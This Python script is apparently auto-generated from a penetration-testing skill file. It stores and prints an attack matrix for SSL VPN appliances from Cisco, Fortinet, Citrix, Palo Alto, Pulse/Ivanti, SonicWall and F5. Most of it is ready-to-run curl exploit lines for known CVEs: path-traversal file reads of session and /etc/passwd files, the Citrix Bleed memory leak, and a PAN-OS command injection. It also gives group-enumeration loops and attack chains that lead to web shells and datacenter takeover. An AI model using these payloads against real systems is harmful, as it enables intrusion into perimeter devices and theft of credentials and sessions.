#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/enterprise-vpn-attack

Skill: Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
Desc : External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.

Run:  python claude-bughunter-enterprise-vpn-attack.py --help
      python claude-bughunter-enterprise-vpn-attack.py --list
      python claude-bughunter-enterprise-vpn-attack.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/enterprise-vpn-attack'
TITLE = 'Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content'
DESCRIPTION = "External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs."

PAYLOADS = {
    'main': ["name: enterprise-vpn-attack", "description: External SSL VPN / remote-access appliance attack matrix \u2014 Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway \u2014 these are the most common initial-access points in 2024-2026 actor TTPs.", "sources: authorized-engagement, public-advisories, cisa-kev", "report_count: 1"],
    'when-to-use-this-skill': ["Trigger when recon surfaces:", "- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths \u2192 Cisco ASA / AnyConnect", "- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains", "- Port 443 returning login pages with `Server: Apache` or banner like \"AnyConnect\", \"FortiGate\", \"NetScaler\", \"GlobalProtect\", \"Pulse\", \"Ivanti\"", "- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)", "- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)", "DO NOT use for:", "- Internal lateral-movement post-foothold (out of scope per user's boundary)", "- VPN client-side bugs (different attack class)", "- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)"],
    'vendor-identification-fingerprinting': [],
    'cisco-asa-anyconnect': ["```bash", "curl -skI 'https://target/+CSCOE+/logon.html' | head -10"],
    'look-for-set-cookie-webvpn-x-frame-options-sameorigin-csp-block-all-mixed-content': [],
    'login-page-contains-anyconnect-cscoe-logon-html': ["ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.", "```bash"],
    'path-based-version-hints-older-builds-leaked-builds-in-urls': ["curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'", "curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled", "curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint"],
    'fortinet-fortigate-fortios': ["```bash", "curl -skI 'https://target/remote/login' | head -10"],
    'look-for-set-cookie-svpncookie-server-header-missing-or-xxxxxxxx-xxxxx': [],
    'login-page-contains-fortigate-fortinet-ssl-vpn': ["Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response"],
    'citrix-netscaler-adc-gateway': ["```bash", "curl -skI 'https://target/' | head -10"],
    'look-for-set-cookie-nsc-aaa-set-cookie-nsc-user-server-netscaler': [],
    'login-page-contains-netscaler-citrix-gateway': [],
    'version-banner': ["curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'", "curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era"],
    'palo-alto-globalprotect': ["```bash", "curl -skI 'https://target/global-protect/login.esp' | head -10"],
    'look-for-set-cookie-phpsessid-yes-gp-uses-php-server-apache-pa-vm-internal': [],
    'page-contains-globalprotect-portal-pan-os': [],
    'version-banner-via-login-page': ["curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\\s\\S]{0,200}'"],
    'or-check-meta-tag': ["curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'"],
    'pulse-secure-ivanti-connect-secure': ["```bash", "curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10"],
    'look-for-set-cookie-dsauthsession-dspreauth': [],
    'page-contains-pulse-secure-or-ivanti-connect-secure': [],
    'version': ["curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'"],
    'sonicwall-netextender-sma': ["```bash", "curl -skI 'https://target/cgi-bin/welcome' | head -10"],
    'look-for-set-cookie-swap-swapauth': [],
    'page-contains-sonicwall-netextender-sma': [],
    'f5-big-ip-apm': ["```bash", "curl -skI 'https://target/my.policy' | head -10"],
    'look-for-set-cookie-bigipserver-mrhsession': [],
    'server-big-ip-sometimes': [],
    'cve-matrix-pre-auth-or-auth-bypass-2018-2026': [],
    'cisco-asa-anyconnect': ["```bash"],
    'cisco-cve-2020-3452-file-read': ["curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5"],
    'cisco-cve-2018-0296-path-traversal': ["curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20"],
    'files-commonly-retrievable-on-vulnerable-asa': [],
    'cscoe-portal-inc-lua-portal-inclusions-may-reveal-local-users': [],
    'cscoe-session-password-html': [],
    'cscoe-files-files-html': [],
    'fortinet-fortigate-fortios': ["```bash"],
    'fortinet-cve-2018-13379-most-reliably-fingerprintable-file-read': ["curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'"],
    'response-contains-plaintext-usernames-sessions-if-vulnerable': [],
    'fortinet-credential-dump-format-from-cve-2018-13379-dumps-that-hit-pastebin-in-2021': [],
    'ip-port-username-password-and-others': [],
    'citrix-netscaler-adc-gateway': ["```bash"],
    'citrix-bleed-cve-2023-4966-detection': ["HOST=$(python3 -c \"print('A' * 24812)\")", "curl -sk -X POST -H \"Host: $HOST\" \"https://target/oauth/idp/.well-known/openid-configuration\" -o response.txt"],
    'if-response-is-large-10kb-and-contains-random-memory-contents-vulnerable': [],
    'session-tokens-often-present-in-the-memory-dump': [],
    'cve-2019-19781-file-read': ["curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'"],
    'palo-alto-globalprotect': ["```bash"],
    'cve-2024-3400-detection': ["curl -sk -X POST 'https://target/ssl-vpn/login.esp' \\", "-H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \\", "--data 'jsessionid=test'"],
    'look-for-file-creation-side-effect-on-test-path-palo-creates-file-with-command-output': [],
    'pulse-secure-ivanti-connect-secure-policy-secure': ["```bash"],
    'cve-2019-11510-pulse-file-read': ["curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'"],
    'sonicwall': [],
    'saml-sp-idp-misconfigurations-always-check': ["Most enterprise VPNs now use SAML for SSO. Check SP metadata:", "```bash"],
    'cisco-asa': ["curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50"],
    'fortinet': ["curl -sk 'https://target/remote/saml/metadata' | head -50"],
    'citrix': ["curl -sk 'https://target/saml/login' | head -30", "Look for:", "- `AuthnRequestsSigned=\"false\"` \u2192 see `hunt-saml` for XSW exploitation", "- `WantAssertionsSigned=\"false\"` \u2192 severe; assertion-replay possible", "- Audience-restriction validation gaps", "- Public SP signing cert (for replay/forging attacks)"],
    'default-credentials-test-sparingly-lockout-risk': ["\u26a0 Most enterprise targets have changed these. Test \u22642 attempts per account to avoid lockout."],
    'group-tunnel-group-enumeration-cisco-specific': ["Cisco ASA AAA groups can sometimes be enumerated without auth.", "```bash"],
    'tunnel-group-enumeration-via-timing': ["for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do", "ms=$(curl -sk --max-time 10 -o /dev/null -w \"%{time_total}\" \\", "-X POST \"https://target/+webvpn+/index.html\" \\", "-d \"username=test&password=test&group_list=$group&tgroup=&Login=Login\")", "echo \"$group: ${ms}s\""],
    'larger-differential-timing-group-exists-valid-groups-respond-slower-in-some-builds': [],
    'aaa-backend-identification': ["After auth fails, look at error response details:", "If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy."],
    'common-probe-sequence-5-minute-fingerprint': ["```bash", "TARGET=\"vpn.target.com\""],
    'cisco': ["curl -skI \"https://$TARGET/+CSCOE+/logon.html\" 2>&1 | head -3", "curl -sk \"https://$TARGET/+CSCOE+/saml/sp/metadata\" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml", "curl -sk --path-as-is \"https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest\" -o /tmp/cisco_cve.html"],
    'fortinet': ["curl -skI \"https://$TARGET/remote/login\" 2>&1 | head -3", "curl -sk --path-as-is \"https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt"],
    'citrix': ["curl -skI \"https://$TARGET/\" 2>&1 | head -3", "curl -sk --path-as-is \"https://$TARGET/vpn/../vpns/cfg/smb.conf\" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt", "HOST=$(python3 -c \"print('A' * 24812)\")", "curl -sk -X POST -H \"Host: $HOST\" \"https://$TARGET/oauth/idp/.well-known/openid-configuration\" -o /tmp/citrix_bleed.txt", "wc -c /tmp/citrix_bleed.txt"],
    'palo-alto': ["curl -skI \"https://$TARGET/global-protect/login.esp\" 2>&1 | head -3"],
    'pulse-ivanti': ["curl -skI \"https://$TARGET/dana-na/auth/url_default/welcome.cgi\" 2>&1 | head -3", "curl -sk --path-as-is \"https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt"],
    'nuclei-templates-for-fast-triage': ["Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:", "```bash", "nuclei -u https://target/ \\", "-tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \\", "-severity high,critical -rl 5", "Add `-as` (auto-scan) for broader vuln coverage but slower."],
    'operational-discipline': ["- **Banner-stripped servers (no version disclosure)** are good defense-in-depth \u2014 record as positive finding even if no CVE found", "- **Rate-limit yourself** \u2014 these appliances often log every request to a SIEM. Patient pace, jittered timing.", "- **SAML metadata is anonymous** \u2014 pull it. It's intel about AAA backend.", "- **Don't run pre-auth-RCE PoCs in red team without explicit OK** \u2014 accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.", "- **Document the AAA backend identification** \u2014 knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths."],
    'bridge-to-neighboring-skills': ["- `m365-entra-attack` \u2014 when AAA backend is Entra SAML; cred-spray strategy carries over", "- `hunt-saml` \u2014 XSW / signature-stripping if SAML SP is misconfigured", "- `mid-engagement-ir-detection` \u2014 appliances generate noisy logs; watch for IPS rules being deployed mid-engagement", "- `redteam-mindset` \u2014 banner-stripped \u2260 \"not vulnerable\"; keep digging via behavioral fingerprints"],
    'anti-patterns': ["- **Don't conclude \"patched\" from a 404 on one CVE path** \u2014 patches deploy unevenly; test 3+ CVEs per vendor", "- **Don't trust the version banner alone** \u2014 appliance vendors often backport fixes without bumping the version string", "- **Don't run heavy nuclei scans without rate-limiting** \u2014 these appliances are critical infrastructure", "- **Don't fingerprint by trying all CVE PoCs immediately** \u2014 start with non-disruptive HEAD + version-banner probes", "- **Don't skip SAML metadata** \u2014 even when the appliance is patched, SAML SP misconfig is its own attack surface"],
    'related-skills-chains': ["- **`hunt-rce`** \u2014 Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) \u2192 `hunt-rce` pre-auth path traversal \u2192 arbitrary file write into web-root \u2192 request the file \u2192 web-shell as `root` \u2192 VPN config + LDAP bind credentials extracted.", "- **`hunt-saml`** \u2014 VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable \u2192 IdP fingerprinted \u2192 `hunt-saml` XSW or comment-injection against IdP \u2192 forged assertion \u2192 VPN session established without password/MFA.", "- **`vmware-vcenter-attack`** \u2014 Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell \u2192 cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) \u2192 reuse against internal vCenter \u2192 if scope permits, `vmware-vcenter-attack` \u2192 datacenter takeover.", "- **`hunt-ntlm-info`** \u2014 Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture \u2192 `hunt-ntlm-info` AV_PAIR decode \u2192 internal AD forest name \u2192 `m365-entra-attack` Entra spray on synced tenant.", "- **`mid-engagement-ir-detection`** + **`redteam-report-template`** \u2014 VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE \u2192 baseline capture via `mid-engagement-ir-detection` \u2192 if appliance updates mid-test, capture the patched-state as a SECOND finding \u2192 run both findings through `triage-validation` \u2192 package via `redteam-report-template` with explicit critical-infrastructure framing."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()